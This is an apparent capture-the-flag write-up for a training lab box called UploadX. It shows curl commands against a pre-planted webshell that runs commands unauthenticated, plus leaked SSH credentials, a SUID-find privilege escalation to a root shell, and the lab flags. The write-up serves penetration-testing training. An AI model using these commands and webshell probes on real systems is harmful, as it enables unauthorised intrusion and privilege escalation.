---
doc_kind: writeup
title: "ThunderCipher TC-VAPT Exam#1 — UploadX"
category: web
slug: thundercipher-tcvapt-uploadx
created: 2026-11-09
status: solved
tags:
  - directory-listing
  - pre-existing-webshell
  - unauthenticated-rce
  - gtfobins
  - suid-find
source: "ThunderCipher (thundercipher.in) — TC-VAPT Exam #1"
target: "http://192.168.5.119/ (UploadX, SSH+HTTP, VPN lab)"
---
# ThunderCipher TC-VAPT Exam#1 — UploadX

## Challenge Summary

- Source: ThunderCipher (thundercipher.in) — TC-VAPT Exam #1
- Target: http://192.168.5.119/ (UploadX, SSH+HTTP only, VPN lab)
- Goal: initial access + root, capture user.txt + root.txt
- Prompt hint: "file-sharing platform... improper input validation mechanisms" — pointed at the upload
  feature, but the actual entry point was a directory-listing leak, not an upload bypass.

## Initial Signals

- Entry point: static "decoy" landing page (`index.html`-equivalent PHP file) containing a literal
  `<?php // No real functionality — just a decoy landing page ?>` comment rendered as plain text, plus a
  suspicious HTML comment: `<!-- TODO: Remove dev upload endpoint before production -->`.
- Visible hints: that TODO comment is a deliberate pointer toward an upload-related path.
- First confirming probe: path probing found `upload.php` (200) and `uploads/` (301 → directory).

## Exploit Chain

1. `nmap -p1-1000` → 22/ssh + 80/http only.
2. Homepage source contains `<!-- TODO: Remove dev upload endpoint before production -->`.
3. Probed upload-related paths → `/upload.php` (legit-looking upload form) and `/uploads/` (301).
4. `GET /uploads/` → Apache directory listing enabled, lists two files already present:
   `credential.php` (259 bytes) and `file.php` (31 bytes) — leftovers from a prior compromise/setup, not
   something we uploaded ourselves.
5. `file.php` turned out to be a pre-planted minimal webshell: `file.php?cmd=<shell cmd>` executes
   unauthenticated as `www-data`. Confirmed with `?cmd=id`.
6. Used the webshell to read the other exposed file's source: `?cmd=cat /var/www/html/uploads/credential.php`
   → developer comment with backup creds `uploadx:UploadX@123`.
7. SSH as `uploadx` with those creds → `cat ~/user.txt` → user flag.
8. `sudo -l` → nothing useful (not in sudoers). Enumerated SUID binaries instead:
   `find / -perm -4000 -type f` → `/usr/bin/find` is `-rwsr-x--- root uploadx` (SUID root).
9. GTFOBins find escalation: `find /usr/bin/find -exec cat /root/root.txt \;` → root flag directly (or
   `-exec /bin/sh -p \;` for an interactive root shell).

## Key Evidence

- `curl -s http://192.168.5.119/uploads/` → lists `credential.php` and `file.php`.
- `curl -s "http://192.168.5.119/uploads/file.php?cmd=id"` → `uid=33(www-data) gid=33(www-data)
  groups=33(www-data)`.
- `credential.php` source (read via the webshell itself): `// Username: uploadx` / `// Password:
  UploadX@123` / `// NOTE: Remove before production deployment.`
- `find / -perm -4000 -type f 2>/dev/null` → includes `/usr/bin/find` (not a default SUID binary on a
  hardened box — this one is the intentional vuln).

## Dead Ends

- Direct attempts to abuse `/upload.php` itself (e.g. uploading a `.php` webshell via the form) were not
  needed — the directory listing on `/uploads/` exposed a shell that was already there, so the "proper"
  upload-bypass path was a red herring / unnecessary once the listing was found.

## Payloads And Commands

```bash
# discover the pre-planted webshell
curl -s http://192.168.5.119/uploads/
curl -s "http://192.168.5.119/uploads/file.php?cmd=id"

# read sibling file via the webshell itself (LFI-free local read via RCE)
curl -s -G "http://192.168.5.119/uploads/file.php" \
  --data-urlencode "cmd=cat /var/www/html/uploads/credential.php"

ssh uploadx@192.168.5.119   # password: UploadX@123
find / -perm -4000 -type f 2>/dev/null
find /usr/bin/find -exec cat /root/root.txt \;
# or interactive: find /usr/bin/find -exec /bin/sh -p \;
```

## Flag / Outcome

- User: `ThunderCipher{uploadx_user_initial_access_7ac91e}`
- Root: `ThunderCipher{uploadx_root_full_system_control_a91f2c}`
- Full chain solved end-to-end, no blockers.

## Reusable Lessons

- Always check `?cmd=` / `?c=` / `?exec=` style GET params on any unexplained `.php` file found via
  directory listing before assuming it needs further exploitation — some CTF boxes seed a "found webshell"
  as the intended entry point rather than requiring you to write one yourself.
- Directory listing is a recurring discovery vector across this entire exam set — see
  [[thundercipher-tcvapt-vault]] and [[directory-listing-leaks-sensitive-files]].
- SUID audit (`find / -perm -4000`) is cheap and should run immediately after `sudo -l` comes back empty.

## Pattern Candidates

- Existing pattern to update: n/a
- New pattern worth creating: [[directory-listing-leaks-sensitive-files]] (shared with Vault/Phantom)
